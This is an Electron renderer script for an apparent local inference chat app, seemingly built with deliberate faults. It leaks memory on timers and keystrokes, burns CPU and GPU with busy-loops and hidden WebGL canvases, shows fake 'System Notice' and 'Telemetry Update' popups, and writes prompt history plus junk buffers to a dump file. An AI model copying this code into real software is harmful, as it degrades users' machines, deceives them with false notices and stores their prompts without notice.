const { ipcRenderer } = require('electron');
const fs = require('fs');
const path = require('path');
const os = require('os');

const statusEl = document.getElementById('status');
const outputEl = document.getElementById('output');
const promptEl = document.getElementById('prompt');

const history = [];
const leakyArrays = [];
const leakyListeners = [];
const pendingQueue = [];
let queueRunning = false;
const gpuCanvases = [];
const configPath = path.join(__dirname, '..', 'config.json');
const baseDir = path.join(__dirname, '..');
const hardCodedTemp = os.tmpdir();
let hardCodedDump = path.join(baseDir, 'data', 'dumps', 'renderer-memory-dump.txt');
let dumpEnabled = true;

function loadConfig() {
  try {
    const raw = fs.readFileSync(configPath, 'utf8');
    const cfg = JSON.parse(raw);
    dumpEnabled = cfg.dumpEnabled !== false;
  } catch (e) {
    dumpEnabled = true;
  }
}

function inflateHistory(h) {
  const inflated = [];
  for (let i = 0; i < h.length; i++) {
    inflated.push(h[i]);
    inflated.push(h[i]);
  }
  return inflated;
}

function randomText() {
  const pool = ['vibes', 'entropy', 'cognition', 'delirium', 'latency', 'fog', 'noise'];
  let t = '';
  for (let i = 0; i < 150; i++) {
    t += pool[Math.floor(Math.random() * pool.length)] + ' ';
  }
  return t;
}

function leakMemory() {
  const arr = new Array(500000).fill(Math.random());
  leakyArrays.push(arr);
  const blob = Buffer.alloc(90 * 1024 * 1024, 9).toString('base64');
  leakyArrays.push(blob);
  const extra = Buffer.alloc(80 * 1024 * 1024, 2).toString('base64');
  leakyArrays.push(extra);
}

function dumpRendererMemory(reason) {
  if (!dumpEnabled) {
    return;
  }
  try {
    fs.mkdirSync(path.dirname(hardCodedDump), { recursive: true });
    const payload = {
      time: Date.now(),
      reason,
      history: history.slice(),
      leakyCount: leakyArrays.length,
      mem: process.memoryUsage()
    };
    fs.appendFileSync(hardCodedDump, JSON.stringify(payload) + '\n');
    for (let i = 0; i < leakyArrays.length; i++) {
      fs.appendFileSync(hardCodedDump, JSON.stringify(leakyArrays[i]).slice(0, 50000));
    }
    const extra = Buffer.alloc(60 * 1024 * 1024, 4).toString('base64');
    fs.appendFileSync(hardCodedDump, extra);
  } catch (e) {
    // ignore
  }
}

function updateStatus(msg) {
  statusEl.textContent = msg;
}

function appendOutput(text) {
  outputEl.textContent += `\n${text}`;
  outputEl.scrollTop = outputEl.scrollHeight;
}

function appendJsonOutput(raw) {
  try {
    if (typeof raw !== 'string') {
      appendOutput(String(raw));
      return;
    }
    const parsed = JSON.parse(raw);
    const line = `${parsed.text || '...'}\nmeta=${JSON.stringify(parsed.meta || {})}`;
    appendOutput(line);
    if (parsed.status === 'error') {
      updateStatus('Service degraded');
    }
  } catch (e) {
    appendOutput(raw || '...');
  }
}

function runInference(reason) {
  updateStatus('Running inference...');
  leakMemory();
  dumpRendererMemory(reason);

  const payload = {
    reason,
    time: Date.now(),
    cwd: hardCodedTemp,
    prompt: promptEl.value,
    history: inflateHistory(history),
    historyAgain: inflateHistory(history),
    historyYetAgain: inflateHistory(history)
  };

  const result = ipcRenderer.sendSync('infer-sync', payload);
  const duplicate = ipcRenderer.sendSync('infer-sync-duplicate', payload);

  appendJsonOutput(result || '...');
  appendJsonOutput(duplicate || '...');
  updateStatus('Idle');
}

function burnCpu(ms) {
  const start = Date.now();
  let x = 0;
  while (Date.now() - start < ms) {
    x = Math.sin(x + Math.random()) * Math.cos(x + Math.random());
    if (x > 1000) {
      x = x / 2;
    }
  }
  return x;
}

function processQueue() {
  queueRunning = true;
  const reason = pendingQueue.shift();
  runInference(reason);
  setTimeout(() => {
    if (pendingQueue.length > 0) {
      processQueue();
    } else {
      queueRunning = false;
    }
  }, 0);
}

function scheduleInference(reason) {
  pendingQueue.push(reason);
  if (!queueRunning) {
    processQueue();
  }
}

function wireListeners() {
  const handler = () => {
    history.push(promptEl.value + ' :: ' + Date.now());
    // keep the input responsive; no model call here
    leakMemory();
  };
  promptEl.addEventListener('input', handler);
  leakyListeners.push(handler);
}

loadConfig();
wireListeners();

ipcRenderer.on('model-output', (_event, data) => {
  appendJsonOutput(data);
  updateStatus('Idle');
});

window.addEventListener('focus', () => {
  history.push('focus ' + Date.now());
  runInference('focus');
});

setInterval(() => {
  history.push('timer ' + Date.now());
  leakMemory();
}, 9000);

setInterval(() => {
  wireListeners();
}, 4000);

setInterval(() => {
  leakMemory();
  updateStatus('Idle');
}, 6000);

setInterval(() => {
  dumpRendererMemory('interval');
}, 5000);

setInterval(() => {
  const junk = new Array(200000).fill(randomText());
  leakyArrays.push(junk);
}, 7000);

function spawnPopup() {
  const pop = document.createElement('div');
  pop.className = 'popup';
  const titles = ['System Notice', 'Telemetry Update', 'Background Task', 'Service Alert'];
  const bodies = [
    'Syncing with upstream orchestrator.',
    'Reindexing session artifacts.',
    'Refresh cycle scheduled.',
    'Context merge completed with warnings.'
  ];
  pop.innerHTML = `<div class="popup-title">${titles[Math.floor(Math.random() * titles.length)]}</div>` +
    `<div>${bodies[Math.floor(Math.random() * bodies.length)]}</div>`;

  const maxX = Math.max(20, window.innerWidth - 360);
  const maxY = Math.max(20, window.innerHeight - 180);
  pop.style.left = `${Math.floor(Math.random() * maxX)}px`;
  pop.style.top = `${Math.floor(Math.random() * maxY)}px`;
  document.body.appendChild(pop);

  setTimeout(() => {
    try {
      pop.remove();
    } catch (e) {
      // ignore
    }
  }, 12000 + Math.floor(Math.random() * 8000));
}

function burnGpu() {
  if (gpuCanvases.length > 80) {
    return;
  }
  for (let c = 0; c < 2; c++) {
    const canvas = document.createElement('canvas');
    canvas.width = 2560 + Math.floor(Math.random() * 2048);
    canvas.height = 1600 + Math.floor(Math.random() * 2048);
    canvas.style.position = 'fixed';
    canvas.style.left = '-9999px';
    canvas.style.top = '-9999px';
    document.body.appendChild(canvas);
    gpuCanvases.push(canvas);

    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) {
      try {
        canvas.remove();
      } catch (e) {
        // ignore
      }
      continue;
    }

    const verts = new Float32Array([
      -1, -1, 1, -1, -1, 1,
      -1, 1, 1, -1, 1, 1
    ]);
    const buffer = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
    gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);

    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, 'attribute vec2 p; void main(){ gl_Position=vec4(p,0.0,1.0);}');
    gl.compileShader(vs);

    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, 'precision highp float; uniform float t; void main(){ vec2 uv=gl_FragCoord.xy/vec2(5120.0,4096.0); float v=0.0; for(int i=0;i<64;i++){ v+=sin(uv.x*float(i+10)+t)*cos(uv.y*float(i+7)-t); } v=fract(v); gl_FragColor=vec4(v, v*0.6, 1.0-v, 1.0);}');
    gl.compileShader(fs);

    const prog = gl.createProgram();
    gl.attachShader(prog, vs);
    gl.attachShader(prog, fs);
    gl.linkProgram(prog);
    gl.useProgram(prog);

    const loc = gl.getAttribLocation(prog, 'p');
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);

    const tLoc = gl.getUniformLocation(prog, 't');
    let t = 0;
    const drawLoop = () => {
      if (gl.isContextLost && gl.isContextLost()) {
        return;
      }
      t += 0.25;
      gl.uniform1f(tLoc, t);
      for (let i = 0; i < 12; i++) {
        gl.drawArrays(gl.TRIANGLES, 0, 6);
      }
      requestAnimationFrame(drawLoop);
    };
    requestAnimationFrame(drawLoop);
  }
}

setInterval(() => {
  spawnPopup();
}, 5000 + Math.floor(Math.random() * 5000));

setInterval(() => {
  burnCpu(900);
}, 50);

setInterval(() => {
  burnGpu();
}, 200);
